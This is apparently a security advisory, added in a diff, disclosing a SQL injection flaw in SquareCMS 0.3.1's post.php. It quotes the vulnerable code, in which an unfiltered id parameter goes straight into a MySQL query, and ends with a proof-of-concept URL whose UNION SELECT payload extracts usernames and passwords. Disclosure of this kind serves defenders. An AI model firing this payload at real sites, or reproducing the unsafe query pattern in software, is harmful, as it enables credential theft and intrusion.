@@ -1,0 +1,37 @@
+SquareCMS 0.3.1 (post.php) Remote SQL Injection Vulnerability
+found by cOndemned
+vendor: http://spoolio.co.cc/ 
+download: http://webscripts.softpedia.com/script/Content-Management/Square-CMS-66303.html
+prior versions may also be affected
+
+source of post.php lines 15 - 31:
+
+	$token = $_GET['id'];									// [1]
+	
+	if (isset($token))
+	{
+		if ($result = mysql_query("SELECT * FROM $posts WHERE id=$token LIMIT 1"))	// [2]
+		{
+			if ($row = mysql_fetch_array($result, MYSQL_ASSOC))
+			{
+				header("Location: ".get_friendly_url($row['url']));		// [3]
+				exit();
+			}
+		}
+	}
+	
+	header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found"); // Return a 404			// [4]
+	header("Content-Type: text/plain");
+	print("404 Not Found\n");
+
+
+description:
+
+	User input from  variable token [1] is  being used in the MySQL query [2] without any 
+	filtration, so that there is possibility to run arbitarary sql commands.  If query is 
+	correct (returns proper result) user will be redirected to an url containing response
+	[3]. In other case cms will force throwing 404 server response [4] ....
+
+proof of concept:
+
+	http://target/post.php?id=-1+union+select+1,2,concat_ws(0x3a,username,password),4,5,6,7,8,9+from+square_settings--
